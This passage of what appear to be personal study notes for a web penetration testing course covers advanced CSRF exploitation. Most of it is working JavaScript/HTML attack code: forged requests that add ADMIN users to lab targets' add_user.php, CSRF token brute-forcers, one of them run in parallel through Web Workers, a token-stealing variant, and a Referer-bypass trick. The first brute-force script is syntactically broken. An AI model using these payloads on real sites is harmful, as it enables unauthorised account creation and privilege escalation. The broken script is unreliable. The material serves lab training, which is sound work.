</code></pre><p id="e22ad6b0-38d6-4496-a1d5-761bb6186132" class="">Get token in browser</p><ul id="48af99fc-694b-45cb-adae-19183894b63e" class="bulleted-list"><li style="list-style-type:disc">document.getElementById(‘CSRFToken’).value</li></ul><h3 id="6ef56165-db64-495f-b2a1-9c96e377227a" class=""><strong>Advanced CSRF Exploitation - parte 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#advanced-csrf-exploitation---parte-2"></a></strong></h3><ul id="566e800a-76e1-48a7-9638-a791e6820a87" class="bulleted-list"><li style="list-style-type:disc">Send the token page in BURP to Sequencer</li></ul><ul id="3d7c29e0-001a-4c30-9148-9da6a5120625" class="bulleted-list"><li style="list-style-type:disc">Run the live test</li></ul><ul id="e34f382c-e107-4608-b8f9-b6f9a7b33088" class="bulleted-list"><li style="list-style-type:disc">Save the tokens</li></ul><p id="d5c73702-f10b-46f5-a4bd-6cc657cf40a2" class="">in CMD:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8987b6f2-4297-4aab-912d-6f18f25859e3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sort &lt;token file&gt; // get rid of duplicates
sort &lt;token file&gt; | uniq -c //show the most common tokens
sort &lt;token file&gt; | uniq -c | nl
sort &lt;token file&gt; | uniq &gt; valid_tokens

cd /var/www
nano brutePOST.html
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31e72376-8c83-4939-a373-259e32184e54" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
&lt;body&gt;
  &lt;textarea id=&quot;tokens&quot; row=&quot;12&quot; columns=&quot;60&quot;&gt;
    &lt;copy the valid tokens here&gt;
  &lt;/textarea&gt;

&lt;script&gt;
function XHRPost(tVal){
  var http = new XMLHttpRequest();
  var url = &quot;target.site/add_user.php&quot;;
  var token = tVal;
  var params = &quot;POST data from BURP&quot; //edit the token in the data with the &#x27;token&#x27; variable
  http.open(&quot;POST&quot;, url, true);
  http.withCredentials = &quot;true&quot;;
  http.setRequestHeader(&quot;Content-Type&quot;, &quot;content type from BURP&quot;);
  http.onreadystatechange = function(){
    if(http.readyState&gt; 1){
      //For the SoP we dont care about response
      http.abort();

  }
  # Serialize the param object
  queryParams = Object.keys(params).reduce(functions(a,k){
    a.push(k + &#x27;=&#x27; + encodeURIComponent(params[k]));
    return a

  }, []).join(&#x27;&amp;&#x27;);
  http.send(queryParams);
}
function bruteLoop(TList){
  For (var i=0; i&lt;TList.length; i++){
    XHRPost(Tlist[i]);
  }
}


// Prepare the token list
var tokens = document.getElementById(&#x27;tokens&#x27;).value.replace(/\s+/gm, &#x27;\n&#x27;).split(&#x27;\n&#x27;);
tokens = tokens.filter(Boolean); # remove empty values

bruteLoop (tokens);

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="e8ec7102-643c-4f43-b2e6-4e1d69890eea" class=""><strong>Test the Referer value</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#test-the-referer-value"></a></strong></h3><ul id="c79476e8-6a45-4cf9-ac97-c042deeed268" class="bulleted-list"><li style="list-style-type:disc">Test with subdomain</li></ul><ul id="cd005152-76e9-4d39-a4e0-62feecf07243" class="bulleted-list"><li style="list-style-type:disc">Test in the file name text</li></ul><ul id="fca21bc7-d74f-40d4-b1ae-76bd8d635b53" class="bulleted-list"><li style="list-style-type:disc">In this case, we need to change the file name to the target.url</li></ul><ul id="c3bc5e48-3a85-48e2-abf5-14454aa77fcf" class="bulleted-list"><li style="list-style-type:disc">So the referer can recognize as a trusted sender</li></ul><h3 id="aed8ab7a-9352-4a5f-a48b-57abd1bf3ab4" class=""><strong>nivel 2 Brute forcer with Workers</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#nivel-2-brute-forcer-with-workers"></a></strong></h3><p id="6b9f9044-24a9-4127-8892-4f1e78e75767" class="">brute.js</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7579a997-0a05-4ad5-af7e-d24657a7c9ad" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">self.addEventListener(&#x27;message&#x27;, function (e) {

   var tokens = e.data.tokens;

   function bruteLoop(TList) {
      for (var i = 0; i &lt; TList.length; i++) {
         console.info(&quot;Testing: &quot; + TList[i]);
         XHRPost(TList[i]);
      }

      Terminator();
   }

   function XHRPost(tVal) {
      var http = new XMLHttpRequest();
      var url = &quot;http://{LABID}.csrf.labs/add_user.php&quot;;

      var token = tVal;

      params = {
         &quot;name&quot;: &quot;Malice&quot;,
         &quot;surname&quot;: &quot;Smith&quot;,
         &quot;email&quot;: &quot;malice@hacker.site&quot;,
         &quot;role&quot;: &quot;ADMIN&quot;,
         &quot;submit&quot;: &quot;&quot;,
         &quot;CSRFToken&quot;: token,
      };

      http.open(&quot;POST&quot;, url, true);
      http.withCredentials = &#x27;true&#x27;;

      // Send the proper header information along with the request
      http.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
      http.onreadystatechange = function () {
         if (http.readyState &gt; 1) { // We don&#x27;t care about responses
            // console.warn(&quot;Aborted &quot; + token + &quot; with status &quot; + http.readyState);
            // http.abort();
         }
      };

      // Serialize the data without using JQuery
      queryParams = Object.keys(params).reduce(function (a, k) {
         a.push(k + &#x27;=&#x27; + encodeURIComponent(params[k]));
         return a
      }, []).join(&#x27;&amp;&#x27;);
      http.send(queryParams);
   }

   function Terminator() {
      self.postMessage(&quot;Sir, I&#x27;ve finished... see you later&quot;);
      self.close();
      return;
   }

   // Brute Loop
   bruteLoop(tokens);

}, false);


</code></pre><h3 id="dc7acc8b-b849-4ab7-9878-86bcc0cfba7d" class=""><strong>Simple Brute Force</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#simple-brute-force"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3754fb25-f686-4b00-b24e-4a6077041452" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
   &lt;body&gt;
      &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;
      &lt;textarea id=&quot;tokens&quot; rows=&quot;12&quot; cols=&quot;60&quot;&gt;
         1679091c5a880faf6fb5e6087eb1b2dc
      &lt;/textarea&gt;
      &lt;script&gt;
         function bruteLoop(TList) {
            for (var i = 0; i &lt; TList.length; i++) {
               console.info(&quot;Testing: &quot; + TList[i]);
               XHRPost(TList[i]);
            }
         }

         function XHRPost(tVal) {
            var http = new XMLHttpRequest();
            var url = &quot;http://{LABID}.csrf.labs/add_user.php&quot;;
            var token = tVal;
            params = {
               &quot;name&quot;: &quot;Malice&quot;,
               &quot;surname&quot;: &quot;Smith&quot;,
               &quot;email&quot;: &quot;malice@hacker.site&quot;,
               &quot;role&quot;: &quot;ADMIN&quot;,
               &quot;submit&quot;: &quot;&quot;,
               &quot;CSRFToken&quot;: token,
            };
            http.open(&quot;POST&quot;, url, true);
            http.withCredentials = &#x27;true&#x27;;

            // Send the proper header information along with the request
            http.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);

            http.onreadystatechange = function () {
               if (http.readyState &gt; 1) {
                  // We don&#x27;t care about responses
                  // console.warn(&quot;Aborted &quot; + token + &quot; with status &quot; + http.readyState);
                  http.abort();
               }
            };

            // Serialize the data without using JQuery
            queryParams = Object.keys(params).reduce(function (a, k) {
               a.push(k + &#x27;=&#x27; + encodeURIComponent(params[k]));
               return a
            }, []).join(&#x27;&amp;&#x27;);
            http.send(queryParams);
         }

         var tokens = document.getElementById(&#x27;tokens&#x27;).value.replace(/\s+/gm, &#x27;\n&#x27;).split(&#x27;\n&#x27;);
         tokens = tokens.filter(Boolean); // Remove empty lines

         // Brute Loop
         bruteLoop(tokens);
      &lt;/script&gt;
   &lt;/body&gt;
&lt;/html&gt;


</code></pre><h3 id="15909cfe-4ff8-41f7-9f5b-cbdd96baa7b2" class=""><strong>brutePOST_worker.html</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#brutepost_workerhtml"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b2420835-ac14-4ac2-949b-3c5445ac042e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
   &lt;body&gt;
      &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;
      &lt;textarea id=&quot;tokens&quot; rows=&quot;12&quot; cols=&quot;60&quot;&gt;
         00411460f7c92d2124a67ea0f4cb5f85
      &lt;/textarea&gt;
      &lt;br&gt;
      &lt;h1&gt;Workers results&lt;/h1&gt;
      &lt;span id=&quot;workers&quot;&gt;&lt;/span&gt;

      &lt;script&gt;
         function startBlock(worker, tokens) {
            worker.postMessage({
               &#x27;tokens&#x27;: tokens
            });
         }

         var bruterPath = &quot;csrf.labs.bruter.js&quot;;

         var ww1 = new Worker(bruterPath);
         ww1.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww1&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var ww2 = new Worker(bruterPath);
         ww2.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww2&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var ww3 = new Worker(bruterPath);
         ww3.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww3&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var tokens = document.getElementById(&#x27;tokens&#x27;).value.replace(/\s+/gm, &#x27;\n&#x27;).split(&#x27;\n&#x27;);
         tokens = tokens.filter(Boolean);

         startBlock(ww1, tokens.slice(0, 333));
         startBlock(ww2, tokens.slice(333, 666));
         startBlock(ww3, tokens.slice(666, tokens.length));
      &lt;/script&gt;

      &lt;div&gt;
         &lt;img src=&quot;counter.gif&quot; /&gt;
      &lt;/div&gt;
   &lt;/body&gt;
&lt;/html&gt;
</code></pre><h2 id="47b3b066-ddc9-4f00-9ea9-1f3208c4f4a6" class=""><strong>LAB CSRF</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#lab-csrf"></a></strong></h2><h3 id="a0e46721-0459-4914-88ba-a7d7e80e540d" class=""><strong>Warm-up: CSRF level 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#warm-up-csrf-level-1"></a></strong></h3><p id="cc7567c3-492f-449d-b721-daefd7094c90" class="">warm-up add the user did with BURP</p><h3 id="59093160-92ec-4686-8ffc-c046fe1cf4f7" class=""><strong>Easy: CSRF level 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#easy-csrf-level-2"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="acc169c7-f5b2-40c7-bece-423f72a4a2dc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script type=&quot;text/javascript&quot;&gt;
var url = &quot;http://2.csrf.labs/add_user.php&quot;
var params = &quot;name=talent&amp;surname=joao&amp;email=talent%40hacker.site&amp;role=ADMIN&amp;submit=&quot;
var csrf = new XMLHttpRequest();
csrf.open(&quot;POST&quot;, url, true);
csrf.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
csrf.send(params);
&lt;/script&gt;
</code></pre><h3 id="a8754708-fda2-4f6d-88c5-089b4a19638f" class=""><strong>Easy: CSRF level 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#easy-csrf-level-3"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="746b6742-99e1-4668-a450-2e687387742a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">test2
&lt;script type=&quot;text/javascript&quot;&gt;
function addUser(token) {
    var url = &quot;http://3.csrf.labs/add_user.php&quot;;
    var param = &quot;name=Malice&amp;surname=Smith&amp;email=malice%40hacker.site&amp;role=ADMIN&amp;submit=&amp;CSRFToken=&quot; + token;
    var CSRF = new XMLHttpRequest();
    CSRF.open(&quot;POST&quot;,url,true);
    CSRF.withCredentials = &#x27;true&#x27;;
    CSRF.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
    CSRF.send(param);
}
// Extract the token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function() {
    if (XHR.readyState == 4 ) {
        var htmlSource = XHR.responseText; // the source of users.php
        // Extract the token
        var parser = new DOMParser().parseFromString(htmlSource, &quot;text/html&quot;);
        var token = parser.getElementById(&#x27;CSRFToken&#x27;).value;
        addUser(token);
    }
}
XHR.open(&#x27;GET&#x27;, &#x27;http://3.csrf.labs/users.php&#x27;, true);
XHR.send();
</code></pre><h3 id="3c2390a0-08c6-4ced-b976-ea4b3a4c26f4" class=""><strong>Medium: CSRF level 4</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#medium-csrf-level-4"></a></strong></h3><blockquote id="121ee8e6-07e1-4fbc-9b39-abd48942620c" class="">I had to change the localhost in /etc/hosts value to a subdomain of the target such as: hacker.site.4.csrf.labs So the referer was not blocked</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="431a0df6-458b-495c-918e-8d522148a738" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
   &lt;body&gt;
      &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;
      &lt;textarea id=&quot;tokens&quot; rows=&quot;12&quot; cols=&quot;60&quot;&gt;
         1679091c5a880faf6fb5e6087eb1b2dc
         45c48cce2e2d7fbdea1afc51c7c6ad26
         8f14e45fceea167a5a36dedd4bea2543
         a87ff679a2f3e71d9181a67b7542122c
         c4ca4238a0b923820dcc509a6f75849b
         c81e728d9d4c2f636f067f89cc14862c
         c9f0f895fb98ab9159f51fd0297e236d
         cfcd208495d565ef66e7dff9f98764da
         d3d9446802a44259755d38e6d163e820
         e4da3b7fbbce2345d7772b0674a318d5
         eccbc87e4b5ce2fe28308fd9f2a7baf3
      &lt;/textarea&gt;
      &lt;script&gt;
         function bruteLoop(TList) {
            for (var i = 0; i &lt; TList.length; i++) {
               console.info(&quot;Testing: &quot; + TList[i]);
               XHRPost(TList[i]);
            }
         }

         function XHRPost(tVal) {
            var http = new XMLHttpRequest();
            var url = &quot;http://4.csrf.labs/add_user.php&quot;;
            var token = tVal;
            params = {
               &quot;name&quot;: &quot;Johnny&quot;,
               &quot;surname&quot;: &quot;praq&quot;,
               &quot;email&quot;: &quot;john@hacker.site&quot;,
               &quot;role&quot;: &quot;ADMIN&quot;,
               &quot;submit&quot;: &quot;&quot;,
               &quot;CSRFToken&quot;: token,
            };
            http.open(&quot;POST&quot;, url, true);
            http.withCredentials = &#x27;true&#x27;;

            // Send the proper header information along with the request
            http.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
            http.onreadystatechange = function () {
               if (http.readyState &gt; 1) {// We don&#x27;t care about responses
                  // console.warn(&quot;Aborted &quot; + token + &quot; with status &quot; + http.readyState);
                  http.abort();
               }
            };

            // Serialize the data without using JQuery
            queryParams = Object.keys(params).reduce(function (a, k) {
               a.push(k + &#x27;=&#x27; + encodeURIComponent(params[k]));
               return a
            }, []).join(&#x27;&amp;&#x27;);
            http.send(queryParams);
         }

         var tokens = document.getElementById(&#x27;tokens&#x27;).value.replace(/\s+/gm, &#x27;\n&#x27;).split(&#x27;\n&#x27;);
         tokens = tokens.filter(Boolean); // Remove empty lines

         // Brute Loop
         bruteLoop(tokens);
      &lt;/script&gt;
   &lt;/body&gt;
&lt;/html&gt;

</code></pre><h3 id="d86dc664-dcc1-4815-9455-a3440af39bea" class=""><strong>Hard: CSRF level 5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#hard-csrf-level-5"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ea9dfc4-935c-4c67-a44f-942b7478a5a3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
   &lt;body&gt;
      &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;
      &lt;textarea id=&quot;tokens&quot; rows=&quot;12&quot; cols=&quot;60&quot;&gt;
         00411460f7c92d2124a67ea0f4cb5f85
         # add the tokens
      &lt;/textarea&gt;
      &lt;br&gt;
      &lt;h1&gt;Workers results&lt;/h1&gt;
      &lt;span id=&quot;workers&quot;&gt;&lt;/span&gt;

      &lt;script&gt;
         function startBlock(worker, tokens) {
            worker.postMessage({
               &#x27;tokens&#x27;: tokens
            });
         }

         var bruterPath = &quot;csrf.labs.bruter.js&quot;;

         var ww1 = new Worker(bruterPath);
         ww1.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww1&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var ww2 = new Worker(bruterPath);
         ww2.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww2&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var ww3 = new Worker(bruterPath);
         ww3.addEventListener(&#x27;message&#x27;, function (e) {
            document.getElementById(&quot;workers&quot;).innerHTML += &quot;&lt;b&gt;ww3&lt;/b&gt; says: &quot; + e.data + &quot;&lt;br&gt;&quot;;
         }, false);

         var tokens = document.getElementById(&#x27;tokens&#x27;).value.replace(/\s+/gm, &#x27;\n&#x27;).split(&#x27;\n&#x27;);
         tokens = tokens.filter(Boolean);

         startBlock(ww1, tokens.slice(0, 333));
         startBlock(ww2, tokens.slice(333, 666));
         startBlock(ww3, tokens.slice(666, tokens.length));
      &lt;/script&gt;

      &lt;div&gt;
         &lt;img src=&quot;counter.gif&quot; /&gt;
      &lt;/div&gt;
   &lt;/body&gt;
&lt;/html&gt;

</code></pre><h3 id="3d52f997-43b1-4210-ac07-f8f3762beffe" class=""><strong>JS workers</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#js-workers"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f1fe5840-8a65-4798-b71d-fbe06aae1794" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">self.addEventListener(&#x27;message&#x27;, function (e) {
   var tokens = e.data.tokens;

   function bruteLoop(TList) {
      for (var i = 0; i &lt; TList.length; i++) {
         console.info(&quot;Testing: &quot; + TList[i]);
         XHRPost(TList[i]);
      }
      Terminator();
   }

   function XHRPost(tVal) {
      var http = new XMLHttpRequest();
      var url = &quot;http://5.csrf.labs/add_user.php&quot;;

      var token = tVal;

      params = {
         &quot;name&quot;: &quot;luffy&quot;,
         &quot;surname&quot;: &quot;joyboy&quot;,
         &quot;email&quot;: &quot;luffy@hacker.site&quot;,
         &quot;role&quot;: &quot;ADMIN&quot;,
         &quot;submit&quot;: &quot;&quot;,
         &quot;CSRFToken&quot;: token,
      };

      http.open(&quot;POST&quot;, url, true);
      http.withCredentials = &#x27;true&#x27;;

      // Send the proper header information along with the request
      http.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
      http.onreadystatechange = function () {
         if (http.readyState &gt; 1) { // We don&#x27;t care about responses
            http.abort();
         }
      };

      // Serialize the data without using JQuery
      queryParams = Object.keys(params).reduce(function (a, k) {
         a.push(k + &#x27;=&#x27; + encodeURIComponent(params[k]));
         return a
      }, []).join(&#x27;&amp;&#x27;);
      http.send(queryParams);
   }

   function Terminator() {
      self.postMessage(&quot;macacos me mordam&quot;);
      self.close();
      return;
   }

   // Brute Loop
   bruteLoop(tokens);
}, false);
</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>